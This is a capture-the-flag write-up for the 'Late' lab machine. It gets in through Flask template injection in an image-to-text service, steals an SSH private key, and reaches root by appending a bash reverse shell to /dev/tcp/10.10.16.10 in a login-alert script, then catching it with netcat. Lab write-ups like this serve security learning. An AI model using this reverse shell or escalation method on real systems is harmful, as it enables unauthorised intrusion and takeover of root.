## Enumeration

### NMAP

```console
❯ nmap -sV --open 10.10.11.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:19 CEST
Nmap scan report for 10.10.11.156
Host is up (0.084s latency).
Not shown: 961 closed tcp ports (conn-refused), 37 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
```
> We see that port 80 and 22 are open, so we have to go to the website.

### Domains

When we enter the website and look at the source code find this:

![source](source.png) 
_Source code website_


```console
❯ echo "10.10.11.156 late.htb images.late.htb" | sudo tee -a /etc/hosts
```
If we take a look at the domain we will see that there is nothing interesting.

_Domain website_

On the subdomain we have an image to text conversor. This website uses Flask, after doing some [research](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) I know what I need to do.

## Foothold

### Flask injection 

To begin with I'm going to test if this vulnerability works. Using {{ config }} list internal flask configurations, we will give it a try.

![img1](img1.png)
_First image_

After uploading the image we download a txt file with the result. This image gives us the following result, which confirms that it is vulnerable to Flask injection.

_First result_

Following the instructions from the website that explained the Flask injection, we can do RCE.

![img2](img2.png)
_Second image_

Seeing the file `/etc/passwd`{: .filepath} we can figure out that the username to later start an ssh session with this.

_Second result_

Now we just extract the OpenSSH private key and we can login.

_Final image_

Here is the id_rsa file.

_Final result_

### SSH 

```console
❯ ssh -i id_rsa user@late.htb
user@late:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
user@late:~$ 
```

### Privilege Escalation

If we use linpeas, we can see that in `/usr/local/sbin`{: .filepath} we have a high PE vector.

![linpeas](linpeas.png) 
_linpeas output_

If we go to the directory, there is a script with execute permissions.

Well, they make it easy for us. We introduce a reverse shell in the script and then ssh to localhost to trigger the script, since it is a script that alerts of ssh logins.

```console
user@late:/usr/local/sbin$ ls -l
total 4
-rwxr-xr-x 1 user user 433 Jun  4 09:46 ssh-alert.sh
user@late:/usr/local/sbin$ echo 'bash -i >& /dev/tcp/10.10.16.10/4444 0>&1' >> ssh-alert.sh ; ssh localhost
```

While the netcat is active and when we have used the previous command we will already be inside the root user.

```console
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.156] 60668
bash: cannot set terminal process group (27514): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

This machine itself is not difficult but Flask injection makes it  a bit difficult. I had to test the injection with many formats, many times, since the app didn't read it well. Other than that, it is an easy machine.

### Techniques and Tools

1. nmap 
2. linpeas
3. Flask injection 
4. RCE (Remote Code Execution)
5. PE (Privilege Escalation)
